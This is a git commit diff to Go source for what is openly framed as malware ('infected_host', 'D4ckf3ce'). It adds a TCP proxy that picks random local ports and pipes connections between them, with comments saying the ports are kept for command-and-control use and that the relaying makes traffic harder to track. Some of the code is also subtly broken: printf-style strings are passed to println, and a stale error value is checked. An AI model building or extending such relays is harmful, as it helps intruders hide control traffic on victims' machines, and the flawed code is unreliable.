b6611129972dea3c39711f439522a1191969f356
Zin <zinedinemokhefi@gmail.com>
2025-09-14 14:37:40 +0200

    Updates

--- infected_host/main.go
+++ infected_host/main.go
@@ -7,9 +7,12 @@ import (
 )
 
 func main() {
-	fmt.Println("Starting Software...")
+	fmt.Println("Starting D4ckf3ce....")
 	/* What should happen is , 2 rndmly ports in the range from 1200 - 22000 should be picked, with port != port2, those will be printed out to the console.
 	   We enable forwarding on the listening Port, connect to the other rndmly choosen Port, and pipe our connection through there, this makes it harder to track.*/
 	proxy.EnableForwarding_tcp("127.0.0.1")
+	port_original := proxy.Ports_c2[0]
+	port_to_be_forwarded_to := proxy.Ports_c2[1]
+	println("Port_Original: %s, Port_Forwarded_To: %s", port_original, port_to_be_forwarded_to)
 
 }
--- infected_host/proxy/proxy.go
+++ infected_host/proxy/proxy.go
@@ -10,6 +10,13 @@ import (
 	"os"
 )
 
+var Ports_c2 [2]string //Fortnite grr structure to retrieve the Opened Ports on the System, (For c2 use later on.)
+
+func main_ReturnRndmPorts(original_port string, port_to_be_forwarded_to string) {
+	Ports_c2[0] = original_port
+	Ports_c2[1] = port_to_be_forwarded_to
+}
+
 func Rndm_Port() string {
 	port_num := rand.Intn(20000)
 	port_num += 1000
@@ -67,38 +74,51 @@ func EnableForwarding_tcp(ip string) {
 	// written, err := io.Copy()
 
 	typeOfConnection, port_original, port_to_be_forwarded_to := prepare()
+	main_ReturnRndmPorts(port_original, port_to_be_forwarded_to)
 	println("Port_Original: %s, Port_Forwarded_To: %s", port_original, port_to_be_forwarded_to)
 
-	/* Check on how to actually accept a connection xd */
 	origin_list := Listen(typeOfConnection, port_original)
-	origin_conn, err := origin_list.Accept()
 
-	if err != nil {
-		println("Something happend while ACCEPTING() connection..., exiting.")
-		os.Exit(1)
+	for {
+		/*
+			Client A connects to :1234 → Proxy creates Pipe A to :forwarded_port
+
+			Client B connects to :1234 → Proxy creates Pipe B to :forwarded_port
+
+			Client C connects to :1234 → Proxy creates Pipe C to :forwarded_port
+
+			Even i forgot, a port can be just considered as the identifier to connect to, and things to be served over, meaning multiple pipeliens of DataStreams can be obviously achieved.
+		*/
+
+		origin_conn, err := origin_list.Accept()
+
+		if err != nil {
+			println("Something happend while ACCEPTING() connection..., exiting.")
+			os.Exit(1)
+		}
+
+		/*
+			var address = net.JoinHostPort(ip, port_to_be_forwarded_to)
+			pipe_conn, err := net.Dial("tcp", address) // Where to forward.
+		*/
+
+		pipe_conn := SocketConnect(typeOfConnection, ip, port_to_be_forwarded_to)
+
+		if err != nil {
+			fmt.Println("Pipe Connection, using net_dial was not initialized, exiting...)")
+			os.Exit(1)
+		}
+
+		// 2 Go Routines running at the same time.
+		go func() {
+			defer origin_conn.Close()
+			defer pipe_conn.Close()
+			io.Copy(origin_conn, pipe_conn)
+		}()
+		go func() {
+			defer pipe_conn.Close()
+			defer origin_conn.Close()
+			io.Copy(pipe_conn, origin_conn)
+		}()
 	}
-
-	/*
-		var address = net.JoinHostPort(ip, port_to_be_forwarded_to)
-		pipe_conn, err := net.Dial("tcp", address) // Where to forward.
-	*/
-
-	pipe_conn := SocketConnect(typeOfConnection, ip, port_to_be_forwarded_to)
-
-	if err != nil {
-		fmt.Println("Pipe Connection, using net_dial was not initialized, exiting...)")
-		os.Exit(1)
-	}
-
-	go func() {
-		defer origin_conn.Close()
-		defer pipe_conn.Close()
-		io.Copy(origin_conn, pipe_conn)
-	}()
-	go func() {
-		defer pipe_conn.Close()
-		defer origin_conn.Close()
-		io.Copy(pipe_conn, origin_conn)
-	}()
-
 }
